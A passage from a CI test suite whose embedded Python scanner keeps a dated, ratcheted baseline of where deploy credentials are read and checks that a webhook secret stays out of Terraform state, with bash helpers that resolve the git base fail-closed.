    try:
        with open(full, "rb") as fh:
            raw = fh.read()
    except OSError as e:
        unreadable.append("%s (%s)" % (rel, e.__class__.__name__))
        continue
    if ex_ext in BINARY_EXT:
        stat["binary"] += 1
        _rl = raw.lower()
        if any(x.encode() in _rl for x in PREFILTER) and FAM.search(raw.decode("latin-1")):
            unreadable.append("%s (binary extension, but it names the trio)" % rel)
        continue
    if b"\0" in raw:
        # a NUL never hides a file: scan it once with each NUL as a newline and once with the NULs removed (as bash reads it)
        stat["nul"] += 1
        texts = [raw.replace(b"\0", b"\n").decode("utf-8", errors="replace"), raw.replace(b"\0", b"").decode("utf-8", errors="replace")]
    else:
        texts = [raw.decode("utf-8", errors="replace")]
    ex = is_exempt(rel)
    scanned.append(rel)
    if ex:
        stat["exempt"] += 1
    an = analyze(rel, texts)
    if has_read(an):
        stat["hits"] += 1
    ks = keys_of(rel, an, ex)
    if ks:
        key_names[rel] = {n for (_f, n) in ks}
        fcls = file_class(rel, texts[0], an, ex)
        key_files.add(rel)
        for (f, n) in ks:
            need[(f, n)] = "tier-a" if n.startswith(("FALLBACK:", "ALIAS:")) else fcls
    if an["hcloud"] and not ex:
        hcloud_files.add(rel)
    if re.fullmatch(r"apps/web-platform/infra/[^/]+\.tf", rel):
        tf_texts[rel] = texts[0]

if a.scanned_list:
    with open(a.scanned_list, "wb") as fh:
        for r in scanned:
            fh.write(os.fsencode(r) + b"\0")

pairs = {k for k in need if not k[1].startswith(("FALLBACK:", "ALIAS:"))}
fallbacks = {k for k in need if k[1].startswith("FALLBACK:")}
aliases = {k for k in need if k[1].startswith("ALIAS:")}

# ── 2. the baseline ──────────────────────────────────────────────────────────────────────
def read_baseline(path):
    rec = {"exists": os.path.isfile(path), "rows": [], "bad": [], "dup": [], "pins": {k: [] for k in PINS}, "allows": []}
    if not rec["exists"]:
        rec["bad"].append("missing file")
        return rec
    seen, seen_allow = set(), set()
    for i, ln in enumerate(open(path, encoding="utf-8").read().split("\n"), 1):
        if not ln.strip() or ln.startswith("#"):
            continue
        if ln.startswith("@allow"):
            c = ln.split("\t")
            if len(c) != 5 or not all(x.strip() for x in c[1:]):
                rec["bad"].append("line %d: @allow needs 5 non-empty tab-separated fields" % i); continue
            _t, f, n, mx, tg = c
            if not (ROWNAME.fullmatch(n)):
                rec["bad"].append("line %d: @allow name %r is not a trio-family name" % (i, n))
            if mx != "-" and parse_iso(mx) is None:
                rec["bad"].append("line %d: @allow max-expiry %r is not '-' or a strict ISO date" % (i, mx))
            if tg != "#9294:" + group_of(f):
                rec["bad"].append("line %d: @allow tag %r is not the computed group #9294:%s of %s" % (i, tg, group_of(f), f))
            if (f, n) in seen_allow:
                rec["dup"].append("@allow %s %s" % (f, n))
            seen_allow.add((f, n))
            rec["allows"].append((f, n, mx, tg))
            continue
        if ln.startswith("@"):
            m = re.fullmatch(r"@(" + "|".join(PINS) + r")[ \t]+(\S+)", ln)
            if m:
                rec["pins"][m.group(1)].append(m.group(2))
            else:
                rec["bad"].append("line %d: unknown or malformed record %r" % (i, ln.split("\t")[0][:20]))
            continue
        c = ln.split("\t")
        if len(c) != 5 or not all(x.strip() for x in c):
            rec["bad"].append("line %d: need 5 non-empty tab-separated columns (file, name, class, expires, tag)" % i); continue
        f, n, cls, exp, tag = c
        if cls not in ("tier-a", "tier-b", "sink"):
            rec["bad"].append("line %d: class %r is not tier-a|tier-b|sink" % (i, cls))
        if cls == "tier-a":
            d = parse_iso(exp)
            if d is None:
                rec["bad"].append("line %d: tier-a expiry %r is not a strict YYYY-MM-DD date" % (i, exp))
            elif d > MAX_EXPIRY:
                rec["bad"].append("line %d: tier-a expiry %s is later than MAX_EXPIRY %s" % (i, exp, MAX_EXPIRY.isoformat()))
        elif exp != "-":
            rec["bad"].append("line %d: a %s row needs expiry '-', got %r" % (i, cls, exp))
        if not (ROWNAME.fullmatch(n) or re.fullmatch(r"FALLBACK:[A-Z_][A-Z0-9_]*", n) or n in ALIAS_NAMES):
            rec["bad"].append("line %d: name %r is not a trio-family, FALLBACK:* or ALIAS:* name" % (i, n))
        if n.startswith(("FALLBACK:", "ALIAS:")) and cls != "tier-a":
            rec["bad"].append("line %d: %s must be tier-a" % (i, n))
        if tag != "#9294:" + group_of(f):
            rec["bad"].append("line %d: tag %r is not the computed group #9294:%s of %s" % (i, tag, group_of(f), f))
        if (f, n) in seen:
            rec["dup"].append("%s %s" % (f, n))
        seen.add((f, n))
        rec["rows"].append((f, n, cls, exp, tag))
    return rec

if a.mode == "emit":
    prev = read_baseline(a.baseline) if os.path.isfile(a.baseline) else {"rows": [], "allows": []}
    prev_rows = {(f, n): (c, e, t) for f, n, c, e, t in prev["rows"]}
    prev_allow = {(f, n): (mx, tg) for f, n, mx, tg in prev["allows"]}
    for name in PINS:
        print("@%s %s" % (name, PINS[name]))
    for f, n, mx, tg in prev["allows"]:
        if (f, n) not in need:
            print("@allow\t%s\t%s\t%s\t%s" % (f, n, mx, tg))
    for (f, n) in sorted(need):
        c = need[(f, n)]
        if (f, n) in prev_rows:                    # an existing key keeps its tag and its (possibly re-dated) expiry
            _pc, pe, tag = prev_rows[(f, n)]
            exp = (pe if parse_iso(pe) is not None else ROW_EXPIRY) if c == "tier-a" else "-"
        elif (f, n) in prev_allow:                 # a key that spends an @allow takes the allow's tag and max-expiry
            mx, tag = prev_allow[(f, n)]
            exp = (mx if parse_iso(mx) is not None else ROW_EXPIRY) if c == "tier-a" else "-"
        else:
            tag = "#9294:" + group_of(f)
            exp = ROW_EXPIRY if c == "tier-a" else "-"
        print("%s\t%s\t%s\t%s\t%s" % (f, n, c, exp, tag))
    sys.exit(0)

rec = read_baseline(a.baseline)
brs = rec["rows"]
bkeys = {(f, n) for f, n, _c, _e, _t in brs}
bcls = {(f, n): (c, e, t) for f, n, c, e, t in brs}

# ── 3. the base record (shell-resolved) ──────────────────────────────────────────────────
def slurp(name):
    try:
        return open(os.path.join(a.base_dir, name), "rb").read()
    except OSError:
        return b""
def slurp_s(name):
    return slurp(name).decode("utf-8", "replace").strip()

b_status = slurp_s("status") if a.base_dir else "none"
b_arm = slurp_s("arm")
b_ref = slurp_s("ref")
b_msg = slurp_s("msg")
b_shallow = slurp_s("shallow") == "true"
b_stale = slurp_s("stale") == "1"
base_rec = read_baseline(os.path.join(a.base_dir, "base.tsv")) if b_status == "ok" else None

changed, renames, added = set(), [], set()
if b_status == "ok":
    toks = [os.fsdecode(t) for t in slurp("changed.z").split(b"\0")]
    i = 0
    while i < len(toks):
        s = toks[i]
        if not s:
            i += 1; continue
        if s[0] in "RC" and i + 2 < len(toks):
            changed.update((toks[i + 1], toks[i + 2]))
            added.add(toks[i + 2])
            if s[0] == "R":
                renames.append((toks[i + 1], toks[i + 2]))
            i += 3
        elif i + 1 < len(toks):
            changed.add(toks[i + 1])
            if s[0] == "A":
                added.add(toks[i + 1])
            i += 2
        else:
            i += 1
    untracked = {os.fsdecode(t) for t in slurp("untracked.z").split(b"\0") if t}
    changed.update(untracked)
    added.update(untracked)

# ── 4. the rows ──────────────────────────────────────────────────────────────────────────
check("T0: the population is git-derived and non-empty (%d scanned: %d exempt by structure, %d read-shape files; %d binary-extension, %d symlink, %d excluded prefix/own skipped)"
      % (len(scanned), stat["exempt"], stat["hits"], stat["binary"], stat["symlinks"], stat["excluded"]),
      len(scanned) >= 1, "scanned=%d" % len(scanned))

problems = rec["bad"] + ["duplicate %s" % d for d in rec["dup"]]
for _pn in PINS:
    if len(rec["pins"][_pn]) != 1:
        problems.append("expected exactly one @%s record, found %d" % (_pn, len(rec["pins"][_pn])))
check("T5: the baseline is well-formed: 5 columns, a computed-class vocabulary, a family/FALLBACK/ALIAS name, a strict ISO expiry on tier-a (<= MAX_EXPIRY) and '-' elsewhere, a #9294:PR-n tag equal to the computed group, valid @allow lines, one record per pinned constant, no duplicate key",
      rec["exists"] and not problems, "; ".join(problems[:6]))

mism = sorted("%s %s (baseline %s, computed %s)" % (f, n, bcls[(f, n)][0], need[(f, n)]) for (f, n) in bkeys & set(need) if bcls[(f, n)][0] != need[(f, n)])
check("T5c: every row's class agrees with the class the scanner computes (tier-b needs every naming job on a literal Tier-B environment; a read shape is tier-a)",
      not mism, "; ".join(mism[:6]))

pin_bad = []
for _pn in PINS:
    _hv = rec["pins"][_pn][0] if len(rec["pins"][_pn]) == 1 else None
    if _hv != PINS[_pn]:
        pin_bad.append("pin @%s: the baseline record %r differs from the scanner constant %r" % (_pn, _hv, PINS[_pn]))
    if base_rec is not None:
        _bv = base_rec["pins"][_pn][0] if len(base_rec["pins"][_pn]) == 1 else None
        if _bv is None:
            pin_bad.append("pin @%s: the base copy has no single record" % _pn)
        elif _bv != _hv:
            pin_bad.append("pin @%s: the baseline record %r differs from the base copy's %r" % (_pn, _hv, _bv))
check("T6: the guard constants are pinned: the baseline records (stems, exempt class, binary extensions, code extensions under the doc prefixes) equal the scanner constants and the base copy's records (narrowing the population together with its records is RED)",
      not pin_bad, "; ".join(pin_bad))

if a.sibling:
    extra = sorted((PENDING_ENVS - (SIB or set())) - {"deploy-channel"})
    check("E1: the Tier-B environment set is single-sourced from %s (TIER_B_ENVIRONMENTS, %d names) plus only the pending name deploy-channel"
          % (os.path.basename(a.sibling), len(SIB or ())), bool(SIB) and not extra,
          "sibling set %s; pending names the sibling lacks beyond deploy-channel: %s" % (sorted(SIB or ()), extra))
else:
    check("E1: the Tier-B environment set is the fixture set (no sibling given)", True, "envs=%s" % sorted(ENVS))

check("T8: no scanned file was unreadable and no binary-extension file names the trio (a silent skip is a hole in the population) [%d unreadable]" % len(unreadable),
      not unreadable, "; ".join(unreadable[:6]))

unbased = sorted("%s %s" % k for k in need if k not in bkeys)
check("T1: every (file, name) that names a trio credential in code has a baseline row [%d name pairs, %d FALLBACK, %d ALIAS]"
      % (len(pairs), len(fallbacks), len(aliases)), not unbased, "; ".join(unbased[:8]))
stale = sorted("%s %s" % k for k in bkeys if k not in need)
check("T2: every baseline row has a live (file, name) read (a consumer that moved must delete its row)", not stale, "; ".join(stale[:8]))

# T3 / T3w / T3m (F-D)
def is_main_event(ev, ref):
    if ev in ("schedule", "merge_group"):
        return True
    return ev in ("push", "workflow_dispatch") and ref == "refs/heads/main"
main_event = is_main_event(a.event_name, a.event_ref)
tier_a = [(f, n, parse_iso(e)) for f, n, c, e, _t in brs if c == "tier-a" and parse_iso(e) is not None]
expired = sorted((f, n, d) for f, n, d in tier_a if d < TODAY)
soon = sorted((f, n, d) for f, n, d in tier_a if 0 <= (d - TODAY).days <= WARN_DAYS)
if b_status == "ok":
    touched = bool({f for f, _n, _d in tier_a} & changed) or bool({BASELINE_REL, ADR_REL} & changed)
else:
    touched = True
hard = bool(expired) and not main_event and touched
check("T3: no tier-a row is past its expiry on a blocking event that touches a row's file, the baseline or ADR-241 (today %s, event %s%s)"
      % (a.today, a.event_name or "local", "" if main_event else " [blocking]"), not hard,
      "; ".join("%s %s (%s)" % (f, n, d.isoformat()) for f, n, d in ([r for r in expired if r[0] in changed] or expired)[:8])
      + " -- re-date: an ADR-241 line 'Re-date: <date> ... Ruled by <owner>' in a baseline/ADR-only change; or migrate the consumer and delete its row")
warn = []
if soon:
    warn.append("%d of %d tier-a rows expire within %d days (earliest %s)" % (len(soon), len(tier_a), WARN_DAYS, min(d for _f, _n, d in soon).isoformat()))
if expired and not hard and not main_event:
    warn.append("%d of %d tier-a rows are past expiry but this change touches none of their files, the baseline or ADR-241" % (len(expired), len(tier_a)))
check("T3w: " + ("; ".join(warn) if warn else "no tier-a row expires within %d days" % WARN_DAYS), True, "")
if warn:
    anns.append("::warning::%s; %d tier-a rows remain" % ("; ".join(warn), len(tier_a)))
if expired and main_event:
    check("T3m: %d tier-a rows are past expiry (non-blocking on main by ruling)" % len(expired), True, "")
    anns.append("::error::T3m: %d tier-a trio-baseline rows are past expiry on a main-class event; non-blocking by ruling, re-date or migrate them" % len(expired))
else:
    check("T3m: no tier-a row is past expiry on a main-class event", True, "")

# T4: the ratchet (F-B)
v = []
def adr_lines(kind):
    """(file, NAME) pairs / dates for the `Allow:`, `Reclass:` or `Re-date:` lines the diff adds to ADR-241"""
    res = set()
    for ln in slurp_s("adr.diff").split("\n"):
        if kind in ("allow", "reclass"):
            m = re.match(r"\+(?!\+).*?" + ("Allow" if kind == "allow" else "Reclass") + r":\s+(\S+)\s+(\S+)\b.*\bRuled by\s+\S", ln)
            if m:
                res.add((m.group(1), m.group(2)))
        else:
            m = re.match(r"\+(?!\+).*?Re-date:\s+([0-9]{4}-[0-9]{2}-[0-9]{2})\b.*\bRuled by\s+\S", ln)
            if m:
                res.add(m.group(1))
    return res
if b_status == "unresolved":
    v.append("T4 RED: base unresolved (ref %s, arm %s)%s%s" % (b_ref, b_arm,
             " [shallow clone: fetch the base ref, e.g. actions/checkout fetch-depth: 0]" if b_shallow else "",
             (": " + b_msg) if b_msg else ""))
elif b_status == "ok" and base_rec is not None:
    base_by = {(f, n): (c, e, t) for f, n, c, e, t in base_rec["rows"]}
    base_allow = {(f, n): (mx, tg) for f, n, mx, tg in base_rec["allows"]}
    head_allow = {(f, n) for f, n, _mx, _tg in rec["allows"]}
    added_allow = set()
    for ln in slurp_s("addhist.txt").split("\n"):
        c = ln.split("\t")
        if len(c) >= 3 and c[0] == "+@allow":
            added_allow.add((c[1], c[2]))
    ren_new_old = {new: old for old, new in renames}
    extended, reclassed = [], []
    def compare(k, old_k, hrow):
        b = base_by[old_k]
        h = hrow
        if h[2] != b[2]:
            v.append("T4: tag of %s %s changed vs base (%s -> %s)" % (k[0], k[1], b[2], h[2]))
        if b[0] == "sink" and h[0] == "tier-a":
            reclassed.append((k, old_k))      # the one admitted regression: a read shape appeared in a sink file (the RECLASS lane)
        elif not (h[0] == b[0] or (b[0] == "tier-a" and h[0] in ("tier-b", "sink"))):
            v.append("T4: class of %s %s moved backwards or sideways (%s -> %s); only tier-a -> tier-b|sink is forward (and sink -> tier-a through the Reclass lane)" % (k[0], k[1], b[0], h[0]))
        bd, hd = parse_iso(b[1]), parse_iso(h[1])
        if bd is not None and hd is not None and hd > bd:
            extended.append((k, b[1], h[1]))
        if old_k != k and (h[0] != b[0] or h[1] != b[1]):
            v.append("T4: renamed row %s -> %s changed class/expiry" % (old_k[0], k[0]))
    for (f, n, c, e, t) in brs:
        k = (f, n)
        if k in base_by:
            compare(k, k, (c, e, t))
            continue
        old = ren_new_old.get(f)
        if old is not None and (old, n) in base_by:
            compare(k, (old, n), (c, e, t))
            continue
        if k in base_allow:
            mx, tg = base_allow[k]
            if k in head_allow:
                v.append("T4: @allow %s %s was not deleted by the diff that spends it" % k)
            if t != tg:
                v.append("T4: row %s %s tag %s differs from its @allow tag %s" % (f, n, t, tg))
            md, ed = parse_iso(mx), parse_iso(e)
            if (mx == "-" and e != "-") or (md is not None and (ed is None or ed > md)):
                v.append("T4: row %s %s expiry %s exceeds its @allow max-expiry %s" % (f, n, e, mx))
        elif k in added_allow:
            v.append("T4: @allow %s %s was added in the same diff that spends it" % k)
        else:
            v.append("T4: new (file,name) %s %s has no @allow at the merge-base; land a reviewed @allow-only PR first" % k)
    new_allows = sorted(head_allow - set(base_allow))
    if new_allows:
        allow_ok = changed <= {BASELINE_REL, ADR_REL}
        adr_allow = adr_lines("allow")
        for k in new_allows:
            if not (allow_ok and k in adr_allow):
                v.append("T4: new @allow %s %s needs an ADR-241 line 'Allow: <file> <NAME> ... Ruled by <owner>' in a baseline/ADR-only change" % k)
    if extended:
        redate_ok = changed <= {BASELINE_REL, ADR_REL}
        adr_dates = adr_lines("redate")
        if not (redate_ok and all(h in adr_dates for _k, _b, h in extended)):
            v.append("T4: expiry extension needs an ADR-241 line 'Re-date: <date> ... Ruled by <owner>' in a baseline/ADR-only change [%s]"
                     % ", ".join("%s %s %s -> %s" % (k[0], k[1], bb, hh) for k, bb, hh in extended[:4]))
    if reclassed:
        own = {k[0] for k, _o in reclassed} | {o[0] for _k, o in reclassed}
        reclass_ok = changed <= ({BASELINE_REL, ADR_REL} | own)
        adr_rc = adr_lines("reclass")
        if not (reclass_ok and all(k in adr_rc for k, _o in reclassed)):
            v.append("T4: a read shape appeared in a sink file (%s); that class move needs an ADR-241 line 'Reclass: <file> <NAME> ... Ruled by <owner>' for each key, in a change that touches only the baseline, ADR-241 and the moved key's own file"
                     % ", ".join("%s %s" % k for k, _o in reclassed[:4]))
    for old, new in renames:
        old_names = {n for (f, n) in base_by if f == old}
        if old_names and (kb_prose(new, os.path.join(REPO, new)) or is_exempt(new)):
            fp = os.path.join(REPO, new)
            if os.path.isfile(fp) and not os.path.islink(fp):
                an2 = analyze(new, [open(fp, encoding="utf-8", errors="replace").read()])
                still = old_names & (an2["names"] | an2["aliases"] | an2["fallbacks"])
                if still:
                    v.append("T4: %s was renamed into the exempt/excluded path %s and still names %s" % (old, new, sorted(still)))
    # a consumer moved with its rows deleted: the name of a deleted row must not reappear as a KEY of a file this diff ADDED (a
    # file that holds a read shape, or sits outside the exempt class), unless that key spends a reserved @allow. A file that
    # merely MENTIONS the name in the exempt class has no key and is not a consumer; a file the diff only CHANGED is judged by
    # its own rows (T1, T2, the key rules above), not by this check.
    new_of = {old: new for old, new in renames}
    for (f, n) in sorted(base_by):
        if (f, n) in bkeys or (new_of.get(f), n) in bkeys:
            continue
        for p in sorted(added):
            if n in key_names.get(p, ()) and (p, n) not in base_allow:
                v.append("T4: the row %s %s was deleted but %s, new in this diff and holding a read shape or outside the exempt class, now names %s" % (f, n, p, n))
if b_status == "ok":
    t4_detail = "; ".join(v[:6])
elif b_status == "introduction":
    t4_detail = "introduction: the suite is absent at the base; the ratchet starts with the next change"
elif b_status == "skipped":
    t4_detail = "SKIPPED via TRIO_ALLOW_NO_BASE=1 (local only)"
else:
    t4_detail = "; ".join(v[:6])
check("T4: the baseline is a forward-only ratchet against its base copy (arm %s; tag fixed, class forward-only (sink -> tier-a only through an ADR-ruled Reclass), expiry never later, new keys only via a spent @allow, a new @allow only by an ADR-ruled baseline/ADR-only change, renames carry rows)" % (b_arm or "none"),
      b_status in ("introduction", "skipped") or (b_status == "ok" and not v), t4_detail)
if b_stale:
    check("T4w: WARNING this branch predates the suite: the suite is absent at the merge-base but present at %s, so T4 was skipped (introduction arm); rebase on %s" % (b_ref, b_ref), True, "")
    anns.append("::warning::T4w: this branch predates the trio census (absent at the merge-base, present at %s); T4 was skipped, rebase on it" % b_ref)
else:
    check("T4w: the branch does not predate the suite (no stale-introduction warning)", True, "")

creep = sorted(f for f in hcloud_files if group_of(f) in ("PR-3", "PR-4") and f in key_files)
check("T7: no file in the PR-3/PR-4 groups (computed from its path, not the tag column) names HCLOUD_TOKEN (the narrow carrier must not drag the host-destroy credential in)", not creep, "; ".join(creep[:8]))

# ── 5. the HMAC stays out of Terraform state (plan Guard 1, assembly of the state attributes) ─
def tf_text(rel):
    return "\n".join(code_lines(rel, tf_texts[rel]))

def balanced(text, i):
    """index just past the bracket group opening at text[i]"""
    pair = {"(": ")", "[": "]", "{": "}"}
    stack, k = [], i
    while k < len(text):
        c = text[k]
        if c in pair:
            stack.append(pair[c])
        elif stack and c == stack[-1]:
            stack.pop()
            if not stack:
                return k + 1
        k += 1
    return len(text)

SECRETISH = re.compile(r"webhook_deploy_secret|hooks_json", re.I)
tf_rels = sorted(tf_texts)
h1, h2, h3 = [], [], []
for rel in tf_rels:
    t = tf_text(rel)
    for m in re.finditer(r"triggers_replace\s*=\s*", t):
        s = m.end()
        j = re.search(r"[\(\[\{]", t[s:])
        if not j:
            continue
        e = balanced(t, s + j.start())
        expr = t[s:e]
        if SECRETISH.search(expr) and not re.match(r"\s*sha256\(", expr):
            h1.append("%s:%d" % (rel, t.count("\n", 0, m.start()) + 1))
    for m in re.finditer(r'^\s*output\s+"[^"]+"\s*\{', t, re.M):
        e = balanced(t, m.end() - 1)
        if SECRETISH.search(t[m.end():e]):
            h2.append("%s:%d" % (rel, t.count("\n", 0, m.start()) + 1))
    for m in re.finditer(r'^\s*resource\s+"terraform_data"\s+"[^"]+"\s*\{', t, re.M):
        e = balanced(t, m.end() - 1)
        body = t[m.end():e]
        for im in re.finditer(r"^\s*input\s*=\s*", body, re.M):
            k = re.search(r"[\(\[\{\"']", body[im.end():])
            ee = balanced(body, im.end() + k.start()) if k and body[im.end() + k.start()] in "([{" else body.find("\n", im.end())
            if SECRETISH.search(body[im.end():ee]):
                h3.append("%s:%d" % (rel, t.count("\n", 0, m.start()) + 1))
check("H1: every triggers_replace that references the webhook secret or the rendered hooks.json is wrapped in sha256( (the state keeps the hash, not the value) [%d .tf files]" % len(tf_rels),
      not h1, "; ".join(h1[:6]))
check("H2: no output block references the webhook secret or the rendered hooks.json (outputs sit in state in plaintext)", not h2, "; ".join(h2[:6]))
check("H3: no terraform_data input references the webhook secret or the rendered hooks.json (input is stored in state)", not h3, "; ".join(h3[:6]))

for l in out:
    print(l)
if a.ann:
    with open(a.ann, "w", encoding="utf-8") as fh:
        for l in anns:
            fh.write(CTRL.sub(" ", l) + "\n")
print("TRIO_FILES_SCANNED=%d" % len(scanned), file=sys.stderr)
print("TRIO_EXEMPT=%d" % stat["exempt"], file=sys.stderr)
print("TRIO_READSHAPE_HITS=%d" % stat["hits"], file=sys.stderr)
print("TRIO_SKIPPED_UNREADABLE=%d" % len(unreadable), file=sys.stderr)
print("TRIO_BINARY=%d" % stat["binary"], file=sys.stderr)
print("TRIO_NUL_SCANNED=%d" % stat["nul"], file=sys.stderr)
print("TRIO_SYMLINKS=%d" % stat["symlinks"], file=sys.stderr)
print("TRIO_GONE=%d" % stat["gone"], file=sys.stderr)
print("TRIO_EXCLUDED=%d" % stat["excluded"], file=sys.stderr)
print("TRIO_PAIRS=%d FALLBACKS=%d ALIASES=%d" % (len(pairs), len(fallbacks), len(aliases)), file=sys.stderr)
for _root in ROOTS:
    print("TRIO_ROOT_COUNT %s %d" % (_root, sum(1 for r in scanned if r.startswith(_root + "/"))), file=sys.stderr)
PY

# GITQ: git for every call this suite makes. The operator's environment never reaches a fixture: GIT_DIR/WORK_TREE/INDEX
# and injected config are dropped, colour/pager/signature/ext-diff are pinned off, and with GITQ_ISO=1 (every fixture run)
# the global and system config are ignored too (a user `color.ui=always` or `core.excludesFile` must not change a verdict).
GITQ() {
  # shellcheck disable=SC2086
  env -u GIT_DIR -u GIT_WORK_TREE -u GIT_INDEX_FILE -u GIT_CONFIG_COUNT -u GIT_CONFIG_PARAMETERS \
    ${GITQ_ISO:+GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null GIT_CONFIG_NOSYSTEM=1} \
    git -c color.ui=never -c core.pager=cat -c log.showSignature=false -c diff.mnemonicPrefix=false -c diff.noprefix=false "$@"
}
# gc: git for fixture repos (identity and hooks pinned; fixtures never inherit the operator's config)
gc() { GITQ_ISO=1 GITQ -c user.name=fx -c user.email=fx@example.invalid -c commit.gpgsign=false -c core.hooksPath=/dev/null "$@"; }
REAL_GIT="$(command -v git)"

# _rbg <label> <outfile> <git args...>  — run git in $repo, keep stdout in <outfile>. ANY non-zero rc is a failure to
# MEASURE, never an empty answer: it sets status=unresolved and msg (variables of the calling resolve_base).
_rbg() {
  local label="$1" of="$2" r
  shift 2
  assert_fixture_dir "$of"
  GITQ -C "$repo" "$@" > "$of" 2> "$of.err"; r=$?
  if [ "$r" -ne 0 ]; then
    status=unresolved; msg="git $label failed (rc $r): $(head -c 160 "$of.err" | tr -d '\000-\037')"
    return 1
  fi
  return 0
}

# resolve_base <repo> <dir> <ref> [<event> <eventref>]  — the FAIL-CLOSED base resolution (F-B). Writes into <dir>:
#   status (ok|introduction|unresolved|skipped), arm (merge-base|head1|introduction), ref, msg, shallow, stale,
#   base.tsv (the base copy), changed.z/untracked.z (name-status -M90% -z vs the base, plus untracked paths),
#   adr.diff (the ADR-241 diff vs the base), addhist.txt (every `@allow` line added to the baseline since the base).
# Every git call is checked: a failing subcommand is `status=unresolved` with the label that failed, never an empty
# change list (which would read as "touches nothing") and never the green introduction arm.
# QUEUE ENTRY (CTO ruling, #10540): under GITHUB_EVENT_NAME=merge_group on a refs/heads/gh-readonly-queue/* ref the base is
# HEAD^1, the entry's own parent. A queue candidate is main + every entry ahead + this PR (SQUASH: one commit on the previous
# candidate or main), so the merge-base with main would charge this entry with the files of the entries ahead of it and fail
# the baseline/ADR-only predicates of T4 for an allow-only PR. It takes the existing head1 arm and its fail-closed message; every
# other event, and merge_group on any other ref, keeps the merge-base arm.
resolve_base() {
  local repo="$1" d="$2" ref="$3" ev="${4-}" evref="${5-}" head="" mb="" base="" arm="merge-base" status="ok" msg="" shallow=false stale=0 r q=0
  case "$ev:$evref" in merge_group:refs/heads/gh-readonly-queue/*) q=1 ;; esac
  assert_fixture_dir "$repo"
  assert_fixture_dir "$d"
  mkdir -p "$d"
  if [ "$(GITQ -C "$repo" rev-parse --is-shallow-repository 2>/dev/null)" = "true" ]; then shallow=true; fi
  if _rbg "rev-parse HEAD" "$d/head.txt" rev-parse --verify -q 'HEAD^{commit}'; then head="$(cat "$d/head.txt")"; fi
  if [ "$status" = ok ] && ! GITQ -C "$repo" rev-parse --verify -q "$ref^{commit}" > "$d/ref.txt" 2> "$d/ref.err"; then
    status=unresolved; msg="ref $ref does not resolve to a commit"
  fi
  if [ "$status" = ok ] && [ "$q" != 1 ]; then
    GITQ -C "$repo" merge-base HEAD "$ref" > "$d/mb.txt" 2> "$d/mb.err"; r=$?
    if [ "$r" -eq 0 ]; then mb="$(cat "$d/mb.txt")"
    elif [ "$r" -eq 1 ]; then status=unresolved; msg="no merge-base of HEAD and $ref"
    else status=unresolved; msg="git merge-base failed (rc $r): $(head -c 160 "$d/mb.err" | tr -d '\000-\037')"; fi
  fi
  if [ "$status" = ok ]; then
    if [ "$q" = 1 ] || [ "$mb" = "$head" ]; then
      arm=head1
      if _rbg "rev-parse HEAD^1" "$d/b1.txt" rev-parse --verify -q 'HEAD^1^{commit}'; then base="$(cat "$d/b1.txt")"
      elif [ "$q" = 1 ]; then msg="HEAD is a merge-queue entry ($evref) and has no first parent ($msg)"
      else msg="HEAD is $ref and has no first parent ($msg)"; fi
    else
      base="$mb"
    fi
  fi
  if [ "$status" = ok ] && _rbg "ls-tree suite" "$d/ls_suite.z" ls-tree -z --name-only "$base" -- "$SUITE_REL"; then
    if [ ! -s "$d/ls_suite.z" ]; then
      arm=introduction; status=introduction
      if _rbg "ls-tree suite at ref" "$d/ls_ref.z" ls-tree -z --name-only "$ref" -- "$SUITE_REL" && [ -s "$d/ls_ref.z" ]; then stale=1; fi
    elif _rbg "ls-tree baseline" "$d/ls_bl.z" ls-tree -z --name-only "$base" -- "$BASELINE_REL"; then
      if [ ! -s "$d/ls_bl.z" ]; then status=unresolved; msg="$BASELINE_REL is absent at a base where $SUITE_REL exists"
      else _rbg "show baseline" "$d/base.tsv" show "$base:$BASELINE_REL"; fi
    fi
  fi
  if [ "$status" = ok ]; then
    _rbg "diff name-status" "$d/changed.z" diff -M90% --name-status -z --no-color --no-ext-diff "$base" \
      && _rbg "ls-files others" "$d/untracked.z" ls-files -z --others --exclude-standard \
      && _rbg "diff adr" "$d/adr.diff" diff --no-color --no-ext-diff --unified=0 "$base" -- "$ADR_REL" \
      && _rbg "log baseline" "$d/log.diff" log -p --no-color --no-ext-diff --format= "$base..HEAD" -- "$BASELINE_REL" \
      && _rbg "diff baseline" "$d/bl.diff" diff --no-color --no-ext-diff "$base" -- "$BASELINE_REL" \
      && awk '/^\+@allow\t/' "$d/log.diff" "$d/bl.diff" > "$d/addhist.txt"
  fi
  if [ "$status" = unresolved ] && [ "${TRIO_ALLOW_NO_BASE:-}" = "1" ] && [ "${GITHUB_ACTIONS:-}" != "true" ]; then
    status=skipped
    printf '################################################################################\n# WARNING: TRIO_ALLOW_NO_BASE=1 -- the T4 ratchet is DISABLED for this run (local only). #\n################################################################################\n' >&2
  fi
  printf '%s' "$status" > "$d/status"; printf '%s' "$arm" > "$d/arm"; printf '%s' "$ref" > "$d/ref"
  printf '%s' "$msg" > "$d/msg"; printf '%s' "$shallow" > "$d/shallow"; printf '%s' "$stale" > "$d/stale"
}

# --emit-baseline: print the DERIVED baseline records for the live tree (never hand-written). The prose header
# of tests/scripts/trio-baseline.tsv is kept by hand; this prints everything below it. An existing key keeps its tag
# and its (possibly re-dated) expiry; a key that spends an @allow takes the allow's tag and max-expiry.
if [ "${1:-}" = "--emit-baseline" ]; then
  py3 "$T/trio.py" --repo "$REPODIR" --baseline "$BASELINE" --today "$TODAY" --mode emit --sibling "$REPODIR/$SIBLING_REL"
  _emit_rc=$?
  _REACHED_VERDICT=1
  exit "$_emit_rc"
fi

printf '\n=== deploy-channel trio census, Guard 1a (G1, PR-0; #9294, ADR-241) ===\n\n'

NROWS=17
FIXTODAY="2026-10-15"
FIXENVS="infra-privileged,deploy-channel"
# run_full <repo> <baseline> <out>  — resolve the base, run the scanner, write the TSV rows to <out>.
# Knobs (set in a subshell by the caller): RF_REF RF_TODAY RF_EVENT RF_EVENTREF RF_ENVS RF_SIB RF_PY
run_full() {
  local repo="$1" bl="$2" out="$3"
  assert_fixture_dir "$repo"
  assert_fixture_dir "$out"
  rm -rf "$out.bd"
  resolve_base "$repo" "$out.bd" "${RF_REF-refs/remotes/origin/main}" "${RF_EVENT-}" "${RF_EVENTREF-}" 2> "$out.bd.err"
  py3 "${RF_PY:-$T/trio.py}" --repo "$repo" --baseline "$bl" --base-dir "$out.bd" --today "${RF_TODAY-$FIXTODAY}" \
    --event-name "${RF_EVENT-}" --event-ref "${RF_EVENTREF-}" --envs "${RF_ENVS-$FIXENVS}" --sibling "${RF_SIB-}" --ann "$out.ann" \
